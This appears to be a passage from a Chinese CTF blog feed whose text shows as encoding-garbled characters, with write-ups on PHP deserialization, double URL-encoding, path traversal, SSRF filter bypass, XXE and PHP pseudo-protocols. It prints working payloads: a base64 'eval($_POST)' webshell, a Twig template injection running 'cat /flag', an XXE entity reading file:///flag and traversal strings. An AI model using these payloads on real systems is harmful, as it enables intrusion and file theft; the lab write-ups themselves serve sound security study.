æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰ç›´æ¥é€šè¿‡Webæµè§ˆå™¨æŸ¥çœ‹phpä»£ç çš„å†…å®¹ã€‚</p></blockquote></li></ul><blockquote><p>å› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨â€œçœ‹åˆ°â€phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚                 </p></blockquote><p><a href="https://www.imagehub.cc/image/6kd0R"><img src="https://s1.imagehub.cc/images/2021/01/19/PHP202.md.png" alt="PHP202.md.png"></a><br>æ„æ€æ˜¯GETæ–¹å¼çš„åˆ°çš„idç»è¿‡urlè§£å¯†åä¸ç­‰äºadminï¼Œç„¶å$_GET(id)=adminï¼›æ‰€ä»¥å°†adminäºŒæ¬¡urlåŠ å¯†ï¼ŒurlåŠ å¯†å°±æ˜¯ASCIIç çš„åå…­è¿›åˆ¶å‰åŠ ä¸ª%ï¼›äºŒæ¬¡åŠ å¯†ï¼Œå°†%æ¢ä¸º%25<br><strong>payloadï¼š</strong>?id=%2561dmin<br>å¾—åˆ°flag<br><a href="https://www.imagehub.cc/image/6kfFF"><img src="https://s1.imagehub.cc/images/2021/01/19/php203.md.png" alt="php203.md.png"></a>     </p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a><code>Web_php_unserialize</code></h2><pre><code>&lt;?php class Demo &#123;     private $file = &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file != &#39;index.php&#39;) &#123;             //the secret is in the fl4g.php            $this-&gt;file = &#39;index.php&#39;;         &#125;     &#125; &#125;if (isset($_GET[&#39;var&#39;])) &#123;     $var = base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;       </code></pre><p><code>__wakeup</code>ç»•è¿‡â€”-æ”¹å¯¹è±¡å±æ€§ä¸ªæ•°<br><code>/[oc]:\d+:/i</code>â€”-è¿™ä¸ªåŒ¹é…çš„æ˜¯<code>o : 4</code>è¿™ä¸ªæ•´ä½“ï¼ŒåŠ ä¸ª <code>+</code>ç»•è¿‡         </p><pre><code>&lt;?phpclass Demo&#123;    private $file=&#39;fl4g.php&#39;;&#125;$a=new Demo();$b=serialize($a);$b = str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$b);//ç»•è¿‡preg_matchecho $b;    echo &quot;&lt;br&gt;&quot;;$b = str_replace(&#39;:1:&#39;, &#39;:2:&#39;,$b);//ç»•è¿‡wakeupecho $b;    echo &quot;&lt;br&gt;&quot;;echo (base64_encode($b));?&gt;       </code></pre><p>ç»“æœï¼š         </p><pre><code>O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==          </code></pre><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a><code>[GKCTF2020]CheckIN</code></h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassName</span></span><span class="hljs-class"></span>&#123;        <span class="hljs-keyword">public</span> $code = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">public</span> $decode = <span class="hljs-literal">null</span>;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;                <span class="hljs-keyword">$this</span>-&gt;code = @<span class="hljs-keyword">$this</span>-&gt;x()[<span class="hljs-string">&#x27;Ginkgo&#x27;</span>];          <span class="hljs-comment">##ä»¥Ginkgoä¼ å‚                  </span>                <span class="hljs-keyword">$this</span>-&gt;decode = @base64_decode( <span class="hljs-keyword">$this</span>-&gt;code );           <span class="hljs-comment">##base64è§£ç </span>                @<span class="hljs-keyword">Eval</span>(<span class="hljs-keyword">$this</span>-&gt;decode);      <span class="hljs-comment">##æ‰§è¡Œ</span>        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;                <span class="hljs-keyword">return</span> $_REQUEST;        &#125;&#125;<span class="hljs-keyword">new</span> ClassName();</code></pre></code></pre><p>å…ˆä¼ ä¸ªphpinfoå§   </p><pre><code>phpinfo();cGhwaW5mbygpOw==  </code></pre><p>å‘ç°ä¸€äº›è¢«ç¦çš„å‡½æ•°</p><p><img src="https://ftp.bmp.ovh/imgs/2021/02/6f0dd5d7bcae5fd6.png"><br>æ¥ä¸‹æ¥ä¼ ä¸ªä¸€å¥è¯      </p><pre><code>eval($_POST[&#39;123&#39;]);CmV2YWwoJF9QT1NUWycxMjMnXSk7       </code></pre><p>èšå‰‘è¿æ¥<br><img src="https://ftp.bmp.ovh/imgs/2021/02/9c14b4dc6443408a.png"><br>æ ¹ç›®å½•ä¸‹å‘ç°<code>flag</code>ï¼Œä½†æ‰“å¼€æ˜¯ç©ºç™½<br>è¿˜æœ‰ä¸ª<code>readflag</code>è¦é€šè¿‡è¿™ä¸ªè¯»å–flag         </p><p>ä¸€ä¸ª<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">exploi</a><br>æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†™å…¥è¿™ä¸ªï¼Œä¿å­˜ï¼Œç„¶åç”¨åˆšæ‰çš„ä¸€å¥è¯includeä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶å°±èƒ½å¾—åˆ°flagäº†<img src="https://ftp.bmp.ovh/imgs/2021/02/b49d755f776b0ecc.png">           </p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/e122cab0ec2e8bd0.png"><br>é¢˜ç›®æç¤ºæ˜¯xml<br>æŠ“åŒ…<br>payloadï¼š</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2021/02/a247f5074ab04e29.png"><br>çŸ¥è¯†ç‚¹ï¼š<a href="https://xz.aliyun.com/t/6887#toc-0">xmlå¤–éƒ¨å®ä½“æ³¨å…¥</a>â€”â€”&gt;æ–‡ä»¶è¯»å–       </p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/e795df96af35b06c.png"><br>ä¹°é©¬<br><code>price=10----------------&gt;Only one char(?) allowed! </code><br>ä¹°åˆ°ç¬¬å››åªé©¬å°±èƒ½å¾—åˆ°flag<br>æºç æœ‰æ³¨é‡Š``</p><meta charset="utf-8"><!--Ah,really important,seriously. -->``          <pre><code>UTF-8ï¼ˆ8ä½å…ƒï¼ŒUniversal Character Set/Unicode         Transformation Formatï¼‰æ˜¯é’ˆå¯¹Unicodeçš„ä¸€ç§å¯å˜é•¿åº¦å­—ç¬¦ç¼– ç ã€‚å®ƒå¯ä»¥ç”¨æ¥è¡¨ç¤ºUnicodeæ ‡å‡†ä¸­çš„ä»»ä½•å­—ç¬¦             </code></pre><p>æ‰¾ä¸€ä¸ªUnicodeå­—ç¬¦ï¼Œå…¶æ•°å­—å¤§äº1337å³å¯<br>ç½‘ç«™ï¼š<a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a><br>è¿™é‡Œæˆ‘æ‰¾äº†ä¸ªä¸‰åƒçš„ï¼Œç„¶åå¤åˆ¶æäº¤å³å¯<br><img src="https://ftp.bmp.ovh/imgs/2021/02/4c6a8d395e0c3a62.png"><br><a href="https://xz.aliyun.com/t/5402#toc-0">æµ…è°ˆUnicodeè®¾è®¡çš„å®‰å…¨æ€§</a>      </p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/3e914a1527e27c01.png"><br>è¿”å›49<br><code>&#123;&#123;7*'7'&#125;&#125;</code>  è¿”å›ä¹Ÿæ˜¯49<br><code>Twigæ¨¡æ¿æ³¨å…¥ </code>      </p><pre><code>Twig &#123;&#123;7*'7'&#125;&#125;  #è¾“å‡º49Jinja&#123;&#123;7*'7'&#125;&#125;  #è¾“å‡º7777777            </code></pre><p>æŠ“åŒ…<br>æ³¨å…¥ç‚¹æ˜¯cookieçš„user       </p><p>payload:<code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code>      </p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">MORE</a>      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜001</title>
    <link href="/2021/01/15/BUU001/"/>
    <url>/2021/01/15/BUU001/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ã€"><a href="#ä¸€ã€" class="headerlink" title="ä¸€ã€"></a>ä¸€ã€</h2><ul><li>é¢˜ç›®ï¼š PHPä»£ç å®¡è®¡</li></ul><p>é¡µé¢ä¸€ä¸ªè¡¨æƒ…ï¼ŒæŸ¥çœ‹æºä»£ç <br><img src="https://ftp.bmp.ovh/imgs/2021/01/6b4ea505386b6788.png"></p><p>è®¿é—®<code>source.php</code>,å¾—åˆ°PHPä»£ç      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   highlight_file(<span class="hljs-keyword">__FILE__</span>);   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><span class="hljs-class">   </span>&#123;       <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;$page</span>)</span><span class="hljs-function">       </span>&#123;            $whitelist = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];     <span class="hljs-comment">//$whitelistæœ‰&quot;source.php&quot;å’Œ&quot;hint.php&quot;ä¸¤ä¸ªå­—ç¬¦ä¸²</span>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;       <span class="hljs-comment">//è¦æ±‚$pageå­˜åœ¨ä¸”æ˜¯å­—ç¬¦ä¸²</span>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        <span class="hljs-comment">//$pageä¸­çš„å­—ç¬¦ä¸²åº”è¯¥å«äº$whitelistä¸­</span>            &#125;            $_page = mb_substr(                $page,                <span class="hljs-number">0</span>,                mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)            );          <span class="hljs-comment">//æˆªå–$pageä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦åˆ° ï¼Ÿ æ³¨æ„mb_strposå‡½æ•°ç¬¬ä¸€ä¸ª ï¼Ÿ å‰æ˜¯ä¸ªè¿æ¥ç¬¦ .</span>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;                  &#125;            <span class="hljs-comment">//å†æ¬¡æ¯”è¾ƒ</span>            $_page = urldecode($page);    <span class="hljs-comment">//å°†$pageè§£ç </span>            $_page = mb_substr(                $_page,                <span class="hljs-number">0</span>,                mb_strpos($_page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)            );       <span class="hljs-comment">//æˆªå–</span>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;       <span class="hljs-comment">//æ¯”è¾ƒ</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])    ) &#123;        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>];        <span class="hljs-keyword">exit</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;   &#125;  <span class="hljs-meta">?&gt;</span></code></pre></code></pre><ul><li>åˆ†æ</li></ul><p>é¦–å…ˆï¼Œçœ‹åˆ°ä¸ª<code>hint.php</code>,ä¼ ä¸ª<code>file=hint.php</code>å¾—åˆ°çš„ç»“æœæ˜¯ï¼š<code>flag not here, and flag in ffffllllaaaagggg</code>è¿™ä¸ªå‘Šè¯‰äº†æˆ‘ä»¬flagæ‰€åœ¨çš„æ–‡ä»¶åï¼›      </p><p>åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆï¼šç¬¬ä¸€ä¸ªã€ç¬¬äºŒä¸ª<code>if</code>å¯ä»¥è¿‡å»ï¼Œæˆªå–å‡½æ•°é‚£é‡Œï¼Œå…ˆåŠ ä¸ª ï¼Ÿ ç„¶åæˆªå–ç¬¬ä¸€ä¸ªå­—ç¬¦åˆ° ï¼Ÿ ï¼Œè¿˜æ˜¯<code>hint.php</code>;æ²¡æœ‰ç»è¿‡urlç¼–ç ï¼Œè§£ç åè¿˜æ˜¯é‚£æ ·ï¼›ä¸‹é¢ä¸€ä¸ªä¹Ÿä¸€æ ·ï¼›æœ€åincludeå‡½æ•°åŒ…å«å¹¶è¿è¡Œ<code>hint.php</code>ï¼Œå¾—åˆ°å…¶ä¸­çš„å†…å®¹ã€‚             </p><p>æ¥ä¸‹æ¥æ˜¯includeå‡½æ•°çš„åˆ©ç”¨ï¼š<img src="https://ftp.bmp.ovh/imgs/2021/01/5ef880466d9cffdb.png"></p><ul><li>è§£å†³</li></ul><p>ä¼ å‚ï¼š<code>file=hint.php?/../../../../../../ffffllllaaaagggg</code><br>å¾—åˆ°flagï¼›å…¶ä¸­<code>file=hint.php?/</code>å°†å…¶å½“ä½œæ–‡ä»¶å¤¹ï¼Œ<code>../</code>åˆ°ä¸Šä¸€çº§ç›®å½•ï¼Œæœ€å°‘å››ä¸ªï¼Œå› ä¸ºä¸€èˆ¬WebæœåŠ¡çš„æ–‡ä»¶å¤¹åœ¨<code>/var/www/html</code>ç›®å½•ä¸­ï¼Œå†åŠ ä¸Š<code>source.php?/</code>è¿™ä¸ªâ€œæ–‡ä»¶å¤¹â€ï¼Œæ‰€ä»¥æˆ‘ä»¬æ€»å…±éœ€è¦<code>../</code>å››æ¬¡æ¥è¿”å›åˆ°æ ¹ç›®å½•,ä»è€Œæ‰“å¼€æ–‡ä»¶ï¼Œå¾—åˆ°flagã€‚<img src="https://ftp.bmp.ovh/imgs/2021/01/8875ef30b6a63f6e.png"></p><ul><li>çŸ¥è¯†ç‚¹           <blockquote><ul><li><code>in_array</code>å‡½æ•°ï¼šæ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼<br>è¯­æ³•ï¼š````in_arry(mixed $needle,arry $haystack,bool $strict =false):bool ``<br>å¦‚æœæ²¡æœ‰è®¾ç½®$strick=true,å°†æ¯”è¾ƒç±»å‹æ˜¯å¦ç›¸åŒ<br>mixedçš„æ„æ€æ˜¯å¯ä»¥ä¸ºä»»æ„ç±»å‹<br>å¦‚æœneedleæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™æ¯”è¾ƒæ˜¯åŒºåˆ†å¤§å°å†™çš„<br>å¦‚æœæ‰¾åˆ°needleåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›false<br><a href="https://www.php.net/manual/zh/function.in-array.php">MORE</a> </li><li><code>mb_substr</code>å‡½æ•°ï¼šè¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œ<code>substr()</code>å‡½æ•°åªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œ<code>mb_substr</code>è¿˜æ”¯æŒä¸­æ–‡æ–‡å­—<br>è¯­æ³•ï¼š<code>mb_substr ( string $str , int $start , int $length = NULL , string $encoding = mb_internal_encoding() ) : string</code><br>$str:æå–ç›®æ ‡<br>$start:å¼€å§‹æå–çš„ä½ç½®ï¼›è´Ÿæ•°çš„è¯ä»å°¾å¤„ç¬¬startä¸ªå­—ç¬¦å¼€å§‹<br>$length ï¼šæå–é•¿åº¦ï¼›å¦‚æœçœç•¥æˆ–ä¼ å…¥NULLï¼Œåˆ™ä¼šæå–åˆ°å°¾éƒ¨<br>$encoding: ä¸ºå­—ç¬¦ç¼–ç ï¼›å¦‚æœçœç•¥æˆ–æ˜¯NULLï¼Œåˆ™ä½¿ç”¨å†…éƒ¨å­—ç¬¦ç¼–ç ã€‚<br>è¿”å›å€¼ï¼šæå–åˆ°çš„å­—ç¬¦<br><a href="https://www.php.net/manual/zh/function.mb-substr.php">MORE</a>          </li><li>is_stringå‡½æ•°ï¼šæ£€æµ‹å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ã€‚<br><a href="https://www.php.net/manual/zh/function.is-string.php">MORE</a>                       </li><li><code>mb_strpos</code>å‡½æ•°ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®<br>è¯­æ³•ï¼š<code>mb_strpos ( string $haystack , string $needle , int $offset = 0 , string $encoding = mb_internal_encoding() ) : int</code><br>ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯ 0ï¼Œç¬¬äºŒä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯ 1ï¼Œä»¥æ­¤ç±»æ¨ã€‚<br>$offset: æœç´¢ä½ç½®çš„åç§»ã€‚å¦‚æœæ²¡æœ‰æä¾›è¯¥å‚æ•°ï¼Œå°†ä¼šä½¿ç”¨ 0ã€‚è´Ÿæ•°çš„ offset ä¼šä»å­—ç¬¦ä¸²å°¾éƒ¨å¼€å§‹ç»Ÿè®¡ã€‚<br><a href="https://www.php.net/manual/zh/function.mb-strpos.php">MORE</a></li></ul></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF--WP</title>
    <link href="/2020/12/06/SSRFWP/"/>
    <url>/2020/12/06/SSRFWP/</url>
    
    <content type="html"><![CDATA[<h2 id="SSRFâ€“WP"><a href="#SSRFâ€“WP" class="headerlink" title="SSRFâ€“WP"></a>SSRFâ€“WP</h2><p>é¢˜ç›®ï¼š        </p><pre><code>            å•Šè¿™ï¼Œè¿™æ€ä¹ˆ...è¿™file_get_contents()æœ‰å•¥ç”¨å‘¢&lt;?php    echo&#39;&lt;center&gt;&lt;strong&gt;å•Šè¿™ï¼Œè¿™æ€ä¹ˆ...è¿™file_get_contents()æœ‰å•¥ç”¨å‘¢&lt;/strong&gt;&lt;/center&gt;&#39;;    highlight_file(__FILE__);    $url =$_GET [&#39;url&#39;];    if (preg_match(&#39;/dotnet\.com/&#39;, $url))&#123;        if(!preg_match(&#39;/php|file|zip|bzip|zlib|base|data/i&#39;, $url)) &#123;            echo (file_get_contents($url));        &#125;        else &#123;            echo(&#39;æ²¡çœ‹åˆ°è¿‡æ»¤äº†å—...&#39;);        &#125;    &#125;    else&#123;        echo (&quot;è¿™ä¸ªæ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿ&quot;) ;    &#125;//flag is in &#39;/flag&#39;?&gt;è¿™ä¸ªæ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿ          </code></pre><p>ç¬¬ä¸€ä¸ª<code>preg_match</code>æ„æ€æ˜¯$urlä¸­å¿…é¡»åŒ…å«<code>dotnet.com</code>;<br>ç¬¬äºŒä¸ª<code>!preg_match</code>æ„æ€æ˜¯ä¸èƒ½åŒ¹é…åˆ°å…¶ä¸­çš„å­—ç¬¦ï¼Œæœ‰<strong>i</strong>ï¼ŒåŒ…å«å¤§å°å†™ï¼Œè¿™æ ·å°±æŠŠä¼ªåè®®çš„è·¯å µæ­»äº†ã€‚<br>è¿™ä¸ªdotnet.comä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå°±å¯ä»¥åœ¨åé¢åŠ ä¸ª@è¿›è¡Œç»•è¿‡ï¼š<br><code>dotnet.com@123=123</code><br>æ—¢ç„¶ä¼ªåè®®çš„è·¯æ²¡æ³•èµ°ï¼Œç„¶åå»æ‰¾<code>file_get_contents</code>ç›¸å…³çš„çŸ¥è¯†ï¼ŒåŸæ¥PHPè¿˜å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼š<br><strong>phpæºç ä¸­ï¼Œåœ¨å‘ç›®æ ‡è¯·æ±‚æ—¶å…ˆä¼šåˆ¤æ–­ä½¿ç”¨çš„åè®®ã€‚å¦‚æœåè®®æ— æ³•è¯†åˆ«ï¼Œå°±ä¼šè®¤ä¸ºå®ƒæ˜¯ä¸ªç›®å½•ã€‚<br>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ„é€ çš„payload(phpå¦‚æœè¯†åˆ«ä¸äº†å°±ä¼šå½“æˆä¸€ä¸ªç›®å½•)åœ¨è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œç©¿è¶Šåˆ°æ ¹ç›®å½•è¯»å–flag</strong><br>payload:<code>/?url=dotnet.com@0://../../../../../../../../flag</code><br>å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2020/12/fe21b3b3e2b74d5c.png">             </p><h2 id="çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h2><blockquote><ul><li><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚          </p></li><li><p>SSRFä¸­çš„ç»•è¿‡è¿‡æ»¤ï¼š<br>@ç»•è¿‡ï¼š<a href="http://www.baidu.com@127.0.0.1=127.0.0.1/">http://www.baidu.com@127.0.0.1=127.0.0.1</a><br>å°†IPåœ°å€è½¬æ¢æˆåè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼š192.168.0.1&gt;&gt;&gt;&gt;0300.0250.0.1(å…«è¿›åˆ¶)</p></li><li><p>.xip.ioï¼š       </p><blockquote><p>192.168.0.1.xip.io&gt;&gt;&gt;192.168.0.1<br><a href="http://www.10.0.0.1.xip.io/">www.10.0.0.1.xip.io</a> = 10.0.0.1<br>mysite.10.0.0.1.xip.io = 10.0.0.1<br>foo.bar.10.0.0.1.xip.io = 10.0.0.1            </p></blockquote></li><li><p>ç«¯å£ç»•è¿‡ï¼š127.0.0.1&gt;&gt;&gt;127.0.0.1: 80        </p></li><li><p>ç›®å½•ç©¿è¶Šï¼šphpæºç ä¸­ï¼Œåœ¨å‘ç›®æ ‡è¯·æ±‚æ—¶å…ˆä¼šåˆ¤æ–­ä½¿ç”¨çš„åè®®ã€‚å¦‚æœåè®®æ— æ³•è¯†åˆ«ï¼Œå°±ä¼šè®¤ä¸ºå®ƒæ˜¯ä¸ªç›®å½•</p></li></ul></blockquote>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Phpä¼ªåè®®</title>
    <link href="/2020/12/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2020/12/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h1><ul><li>PHPä¼ªåè®®äº‹å®ä¸Šå°±æ˜¯æ”¯æŒçš„åè®®ä¸å°è£…åè®®ã€‚</li><li>é¦–å…ˆï¼Œä»‹ç»ä¸€äº›CTFä¸­å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š<ul><li>1.includeï¼šåŒ…å«å¹¶å¯¹ç»™å®šçš„æ–‡ä»¶è¿›è¡Œè®¡ç®—ã€‚</li><li>2.requireï¼šç”¨äºå¼•å…¥æˆ–è€…åŒ…å«å¤–éƒ¨phpæ–‡ä»¶ã€‚<blockquote><p>includeå’Œrequireçš„åŒºåˆ«ï¼šincludeå¼•å…¥æ–‡ä»¶æŠ¥é”™åä¼šç»§ç»­æ‰§è¡Œä»£ç ï¼Œè€Œrequireå¼•å…¥æ–‡ä»¶æ—¶ï¼Œé‡åˆ°é”™è¯¯åå°±ä¼šåœæ­¢è¿è¡Œä¸‹é¢çš„ä»£ç ã€‚        </p></blockquote></li><li>3.include_once:åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ï¼Œä¸includeçš„åŒºåˆ«æ˜¯è¿™ä¸ªåªèƒ½åŒ…å«ä¸€æ¬¡ã€‚</li><li>4.require_once:ä¸requireç›¸åŒï¼ŒåŒºåˆ«ä¹Ÿæ˜¯åŒ…å«ä¸€æ¬¡ã€‚</li><li>5.highlight_fileï¼šè¯­æ³•é«˜äº®ä¸€ä¸ªæ–‡ä»¶ã€‚</li><li>6.show_sourceï¼šè¿™æ˜¯highlight_fileçš„åˆ«åã€‚</li><li>7.readfileï¼šè¾“å‡ºæ–‡ä»¶ï¼ŒæˆåŠŸæ—¶è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚</li><li>8.file_get_contents ï¼šå°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</li><li>9.fopenï¼šæ‰“å¼€æ–‡ä»¶æˆ–è€…URLã€‚</li><li>10.fileï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ã€‚</li></ul></li></ul><hr><ul><li><strong>file://åè®®</strong>          <blockquote><p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼ŒCTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æ–‡ä»¶<br>file://+æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å<br>file://+æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å’Œæ–‡ä»¶å<br>file://+æ–‡ä»¶çš„ç½‘ç»œè·¯å¾„å’Œæ–‡ä»¶å             </p></blockquote><hr></li><li>  <strong>php://åè®®</strong>      <blockquote><p>ç”¨äºè®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨php://filteræ¥è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„æºç 